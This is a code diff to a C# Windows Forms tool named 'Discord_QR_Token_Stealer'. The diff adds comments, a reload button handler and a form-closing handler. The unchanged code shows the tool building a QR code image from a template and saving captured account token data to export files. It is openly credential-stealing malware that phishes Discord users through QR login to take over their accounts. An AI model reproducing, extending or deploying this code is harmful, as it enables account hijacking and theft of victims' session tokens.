@@ -20,6 +20,7 @@ namespace Discord_QR_Token_Stealer
 {
     public partial class qrGrabber : Form
     {
+        // stupid shit
         public bool createdQr = false;
         public JToken tokenInfo = null;
         public System.Windows.Forms.Timer timeLeftTimer = new System.Windows.Forms.Timer();
@@ -28,6 +29,7 @@ namespace Discord_QR_Token_Stealer
         public DateTime timeEnd;
         public int num = 0;
 
+        // init
         public qrGrabber()
         {
             InitializeComponent();
@@ -114,10 +116,12 @@ namespace Discord_QR_Token_Stealer
             }
         }
 
+        // create the final image
         void createFinalImage()
         {
             try
             {
+                // load template file into picturebox
                 currentCode.Image = Image.FromFile("template.png");
 
                 // qr code
@@ -253,9 +257,17 @@ namespace Discord_QR_Token_Stealer
             File.WriteAllText($"exports/token_export_{tokenInfo["id"].ToString().Substring(1, tokenInfo["id"].ToString().Length - 2)}.txt", JsonConvert.SerializeObject(tokenInfo, Formatting.Indented));
         }
 
+        // reload button
         private void reloadPage_Click(object sender, EventArgs e)
         {
             chromiumWebBrowser1.Load(chromiumWebBrowser1.Address);
+        }
+
+        // fix maybe??
+        // seems to work
+        private void qrGrabber_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            Environment.Exit(0);
         }
     }
 }
